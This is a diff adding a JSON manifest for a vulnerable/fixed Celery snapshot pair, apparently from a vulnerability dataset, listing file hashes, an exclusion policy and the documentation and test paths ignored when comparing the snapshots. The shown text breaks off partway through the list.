@@ -1,0 +1,3166 @@
+{
+  "pair_id": "pyvul-celery-celery-1f7ad7e6df1e",
+  "split": "development",
+  "snapshot_sha256": {
+    "vulnerable": "f724666c5d1e15e5d55f7614d897792fba037144eba4dbd18570efef99d12091",
+    "fixed": "be4731629ec6d4f764ef2af942022927cb97a064243782177f46579500230595"
+  },
+  "generator_sha256": "5c4f82641b9d4c51e01a8c53e48ea4aa355d860a8870c468f64b5b4e5860a66a",
+  "exclusion_policy": {
+    "id": "pair-diff-exclusions-v0",
+    "directories": [
+      "test",
+      "tests",
+      "testing",
+      "__tests__",
+      "spec",
+      "specs",
+      "doc",
+      "docs",
+      "documentation"
+    ],
+    "lockfiles": [
+      "package-lock.json",
+      "npm-shrinkwrap.json",
+      "yarn.lock",
+      "pnpm-lock.yaml",
+      "bun.lock",
+      "bun.lockb",
+      "poetry.lock",
+      "uv.lock",
+      "pipfile.lock",
+      "cargo.lock",
+      "composer.lock",
+      "gemfile.lock"
+    ],
+    "document_extensions": [
+      ".md",
+      ".rst",
+      ".adoc"
+    ],
+    "document_names": [
+      "readme",
+      "license",
+      "licence",
+      "notice",
+      "changelog",
+      "contributing",
+      "authors",
+      "history",
+      "copying"
+    ]
+  },
+  "ignored": {
+    "vulnerable": [
+      {
+        "path": ".github/ISSUE_TEMPLATE.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Bug-Report.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Documentation-Bug-Report.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Enhancement.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Feature-Request.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Major-Version-Release-Checklist.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/ISSUE_TEMPLATE/Minor-Version-Release-Checklist.md",
+        "reason": "documentation"
+      },
+      {
+        "path": ".github/PULL_REQUEST_TEMPLATE.md",
+        "reason": "documentation"
+      },
+      {
+        "path": "CONTRIBUTING.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "Changelog.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "LICENSE",
+        "reason": "documentation"
+      },
+      {
+        "path": "README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "celery/contrib/testing/__init__.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/app.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/manager.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/mocks.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/tasks.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/contrib/testing/worker.py",
+        "reason": "test_directory"
+      },
+      {
+        "path": "celery/utils/dispatch/LICENSE.python",
+        "reason": "documentation"
+      },
+      {
+        "path": "celery/utils/dispatch/license.txt",
+        "reason": "documentation"
+      },
+      {
+        "path": "docker/docs/Dockerfile",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docker/docs/start",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/AUTHORS.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/Makefile",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/THANKS",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/_ext/celerydocs.py",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/_static/.keep",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/_templates/sidebardonations.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/changelog.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/community.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/conf.py",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/configuration.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/contributing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/copyright.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/django/first-steps-with-django.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/django/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/faq.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/rabbitmq.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/redis.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/backends-and-brokers/sqs.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/first-steps-with-celery.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/introduction.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/next-steps.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/getting-started/resources.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/glossary.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-1.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.4.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-2.5.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-3.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-3.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-4.4.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-5.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/changelog-5.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-2.5.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-3.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-3.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-4.4.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-5.0.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/history/whatsnew-5.1.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery-banner-small.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery-banner.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery_128.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celery_512.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/celeryevshotsm.jpg",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/dashboard.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/favicon.ico",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/monitor.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/result_graph.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/images/worker_graph_full.png",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/includes/installation.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/includes/introduction.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/includes/resources.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/app-overview.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/deprecation.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/guide.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/protocol.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery._state.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.app.annotations.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.app.routes.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.app.trace.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.arangodb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.asynchronous.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.azureblockblob.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.cache.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.cassandra.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.consul.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.cosmosdbsql.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.couchbase.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.couchdb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.database.models.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.database.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.database.session.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.dynamodb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.elasticsearch.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.filesystem.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.mongodb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.redis.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.rpc.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.backends.s3.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.eventlet.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.gevent.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.prefork.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.solo.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.concurrency.thread.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.events.cursesmon.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.events.dumper.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.events.snapshot.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.platforms.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.certificate.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.key.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.serialization.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.security.utils.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.abstract.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.collections.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.deprecated.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.dispatch.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.dispatch.signal.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.functional.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.graph.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.imports.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.iso8601.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.log.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.nodenames.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.objects.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.saferepr.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.serialization.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.sysinfo.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.term.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.text.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.threads.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.time.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.utils.timer2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.autoscale.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.components.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.heartbeat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.loops.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/celery.worker.pidbox.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/reference/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/internals/worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/make.bat",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.amqp.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.autoretry.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.backends.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.builtins.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.defaults.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.log.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.registry.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.task.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.app.utils.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.apps.beat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.apps.multi.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.apps.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.beat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.beat.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.call.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.celery.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.graph.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.list.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.logtool.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.migrate.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.multi.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.purge.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.result.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.shell.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.upgrade.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bin.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.bootsteps.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.abortable.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.migrate.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.pytest.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.rdb.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.sphinx.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.app.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.manager.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.mocks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.contrib.testing.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.dispatcher.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.event.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.receiver.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.events.state.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.exceptions.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.app.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.base.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.default.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.loaders.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.result.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.schedules.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.security.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.signals.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.states.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.utils.debug.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.agent.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.connection.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.consumer.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.control.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.events.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.gossip.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.heart.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.mingle.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.consumer.tasks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.request.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.state.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.strategy.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/celery.worker.worker.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/cli.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/reference/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/sec/CELERYSA-0001.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/sec/CELERYSA-0002.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/sec/CELERYSA-0003.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/spelling_wordlist.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/templates/readme.txt",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/daemonizing.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/debugging.html",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/tutorials/task-cookbook.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/application.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/calling.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/canvas.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/concurrency/eventlet.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/concurrency/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/configuration.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/daemonizing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/debugging.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/extending.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/index.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/monitoring.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/optimizing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/periodic-tasks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/routing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/security.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/signals.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/sphinx.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/tasks.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/testing.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/userguide/workers.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "docs/whatsnew-5.2.rst",
+        "reason": "documentation_directory"
+      },
+      {
+        "path": "examples/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "examples/celery_http_gateway/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "examples/django/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "examples/eventlet/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "requirements/README.rst",
+        "reason": "documentation"
+      },
+      {
+        "path": "t/integration/test_backend.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_canvas.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_inspect.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_security.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/integration/test_tasks.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_amqp.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_annotations.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_app.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_backends.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_beat.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_builtins.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_celery.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_control.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_defaults.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_exceptions.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_loaders.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_log.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_registry.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_routes.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_schedules.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/app/test_utils.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/apps/test_multi.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_arangodb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_asynchronous.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_azureblockblob.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_base.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_cache.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_cassandra.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_consul.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_cosmosdbsql.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_couchbase.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_couchdb.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_database.py",
+        "reason": "test_file"
+      },
+      {
+        "path": "t/unit/backends/test_dynamodb.py",
